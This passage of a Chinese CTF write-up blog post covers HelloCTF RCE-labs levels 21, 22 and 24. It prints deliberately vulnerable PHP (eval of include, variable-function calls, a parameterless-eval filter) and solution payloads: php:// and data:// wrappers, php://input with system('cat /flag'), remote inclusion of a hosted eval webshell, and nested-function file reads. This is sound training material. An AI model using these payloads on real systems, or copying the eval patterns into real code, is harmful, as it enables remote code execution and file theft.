<span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 文件包含导致的RCE --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">allow_url_fopen = On</span></span><br><span class="line"><span class="comment">allow_url_include = On</span></span><br><span class="line"><span class="comment">默认全开的环境，可以尝试多种解法，若对此存有疑问，尝试去 github.com/ProbiusOfficial/PHPinclude-labs 了解更多文件包含的知识。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">远程文件包含可用链接(&lt;?php <span class="doctag">@eval</span>($_POST[&#x27;a&#x27;]); ?&gt;)：</span></span><br><span class="line"><span class="comment">https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI</span></span><br><span class="line"><span class="comment">https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">FilterChain的Payload生成器：</span></span><br><span class="line"><span class="comment">https://probiusofficial.github.io/PHP-FilterChain-Exploit/</span></span><br><span class="line"><span class="comment">/exp.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注意：在本关卡中你传递的内容将以字符串的方式拼接在 include() 函数中,你需要区别这与 incluude($_GET[&#x27;file&#x27;]) 的区别。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloctf</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&quot;include(&quot;</span>.<span class="variable">$code</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your includeCode : &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) ? <span class="title function_ invoke__">helloctf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	1、直接读取文件</p>
+<p><code>c=&#39;/flag&#39;;</code></p>
+<p>​	2、使用伪协议</p>
+<p><code>c=&#39;php://filter/convert.base64-encode/resource=/flag&#39;</code></p>
+<p><code>c=&quot;data://text/plain,&lt;?php readfile(&#39;/flag&#39;);&quot;</code></p>
+<p>​	3、input写入</p>
+<p><code>c=&quot;php://input&quot;&amp;&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code></p>
+<p>​	4、远程文件包含</p>
+<p><code>c=https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI&amp;a=&#39;readfile(&#39;/flag&#39;);&#39;</code></p>
+<h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p><strong>PHP 特性 - 动态调用</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : HP 特性 - 动态调用 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP 支持在运行时动态构建并且调用函数，在下面的代码中 a可以被作为函数，b可以被作为函数的参数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">try ?a=system&amp;b=ls</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 支持 <strong>变量函数</strong>（Variable Functions）语法：<br><strong>若变量后跟随 <code>()</code>，PHP 会将该变量的值作为函数名执行</strong></p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法1：直接变量调用</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;id&#x27;</span>);      <span class="comment">// 执行 system(&#x27;id&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法2：括号包裹变量</span></span><br><span class="line">(<span class="variable">$a</span>)(<span class="string">&#x27;id&#x27;</span>);    <span class="comment">// 同样执行 system(&#x27;id&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>因此，在本题中<code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code></p>
+<p><code>$_GET[&#39;a&#39;]</code>被解析为函数名</p>
+<p><code>$_GET[&#39;b&#39;]</code>被解析为函数参数</p>
+<h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p>无参数的RCE</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;get_flag.php&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : PHP 特性 - 无参命令执行 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">根据正则表达式的匹配规则，可以看到我们只能输入A(),这样的形式，括号中无法携带参数，但支持多个函数嵌套A(B(C())),这种形式我们称其为无参命令执行。</span></span><br><span class="line"><span class="comment">无参命令执行的难度首先是在于无参本身，这需要你利用一些函数特性外带参数绕过限制 —— 这可以从一些获取外部值的函数实现：</span></span><br><span class="line"><span class="comment">getallheaders()</span></span><br><span class="line"><span class="comment">session_id()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">其次是对嵌套参数的处理 —— 当然不局限于外带进来的参数，一些诸如 localeconv() 的函数可以获取内部存在的一些参数如当前目录下面的文件信息等:</span></span><br><span class="line"><span class="comment">getchwd() ：函数返回当前工作目录。</span></span><br><span class="line"><span class="comment">scandir() ：函数返回指定目录中的文件和目录的数组。</span></span><br><span class="line"><span class="comment">dirname() ：函数返回路径中的目录部分。</span></span><br><span class="line"><span class="comment">chdir() ：函数改变当前的目录。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通常我们获取到的很多情况下是数组，所以有时候比较依赖对数组的操作，比如：</span></span><br><span class="line"><span class="comment">- array_reverse()：数组反转</span></span><br><span class="line"><span class="comment">- pos()：输出数组第一个元素</span></span><br><span class="line"><span class="comment">- next()：指向数组的下一个元素，并输出</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">随后是一些文件读取显示的操作：</span></span><br><span class="line"><span class="comment">- show_source() - 对文件进行语法高亮显示。</span></span><br><span class="line"><span class="comment">- readfile() - 输出一个文件。</span></span><br><span class="line"><span class="comment">- highlight_file() - 对文件进行语法高亮显示。</span></span><br><span class="line"><span class="comment">- file_get_contents() - 把整个文件读入一个字符串中。</span></span><br><span class="line"><span class="comment">- readgzfile() - 可用于读取非 gzip 格式的文件</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">...你随时可以通过查阅PHP官方手册中函数相关的部分来找到上面类似的内容。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_code</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;O.o&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) ? <span class="title function_ invoke__">hello_code</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left"><strong>功能分类</strong></th>
+<th align="left"><strong>函数名称</strong></th>
+<th align="left"><strong>功能描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>获取外部值</strong></td>
+<td align="left"><code>getallheaders()</code></td>
+<td align="left">获取所有 HTTP 请求头信息</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>session_id()</code></td>
+<td align="left">获取当前会话 ID</td>
+</tr>
+<tr>
+<td align="left"><strong>获取内部参数</strong></td>
+<td align="left"><code>localeconv()</code></td>
+<td align="left">获取当前区域设置的格式信息</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>getcwd()</code></td>
+<td align="left">返回当前工作目录</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>scandir()</code></td>
+<td align="left">返回指定目录中的文件和目录数组</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>dirname()</code></td>
+<td align="left">返回路径中的目录部分</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>chdir()</code></td>
+<td align="left">更改当前工作目录</td>
+</tr>
+<tr>
+<td align="left"><strong>数组操作</strong></td>
+<td align="left"><code>array_reverse()</code></td>
+<td align="left">反转数组</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>pos()</code></td>
+<td align="left">输出数组的第一个元素</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>next()</code></td>
+<td align="left">指向数组的下一个元素并输出</td>
+</tr>
+<tr>
+<td align="left"><strong>文件读取与显示</strong></td>
+<td align="left"><code>show_source()</code></td>
+<td align="left">对文件进行语法高亮显示</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>readfile()</code></td>
+<td align="left">输出文件内容</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>highlight_file()</code></td>
+<td align="left">对文件进行语法高亮显示</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>file_get_contents()</code></td>
+<td align="left">将整个文件读入字符串</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>readgzfile()</code></td>
+<td align="left">读取文件（支持非 gzip 格式）</td>
+</tr>
+</tbody></table>
+<p><strong>说明</strong>：</p>
+<ol>
+<li>无参命令执行的核心在于利用函数特性绕过无参限制，通过获取外部值或内部参数实现功能。</li>
+<li>数组操作函数常用于处理获取到的数组数据。</li>
+<li>文件操作函数用于读取或显示目标文件内容，常用于信息泄露或代码分析场景。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="comment">#array(6) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(8) &quot;flag.php&quot; [3]=&gt; string(12) &quot;get_flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; [5]=&gt; string(7) &quot;uploads&quot; &#125; </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+
+<p>随机读取：</p>
+<p><strong>array_flip</strong>确保 array_rand() 返回文件名（键），而不是索引（值）。</p>
+<p><strong>array_rand</strong>：避免直接索引（如 scandir()[2]），随机选择文件名（键）。</p>
+<p>颠倒键与值后，随机读取键（文件名）</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">5.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6"><span class="toc-number">6.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7"><span class="toc-number">7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8"><span class="toc-number">8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9"><span class="toc-number">9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-number">10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-number">11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level17"><span class="toc-number">12.</span> <span class="toc-text">level17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">12.1.</span> <span class="toc-text">RCE无回显命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="toc-number">12.1.1.</span> <span class="toc-text">判断：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">12.1.2.</span> <span class="toc-text">执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level18"><span class="toc-number">13.</span> <span class="toc-text">level18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level19"><span class="toc-number">14.</span> <span class="toc-text">level19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level20"><span class="toc-number">15.</span> <span class="toc-text">level20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level21"><span class="toc-number">16.</span> <span class="toc-text">level21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level22"><span class="toc-number">17.</span> <span class="toc-text">level22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level24"><span class="toc-number">18.</span> <span class="toc-text">level24</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/26/RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/26/RCE/&text=RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/26/RCE/&is_video=false&description=RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE&body=Check out this article: http://example.com/2025/05/26/RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/26/RCE/&name=RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/26/RCE/&t=RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    xin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
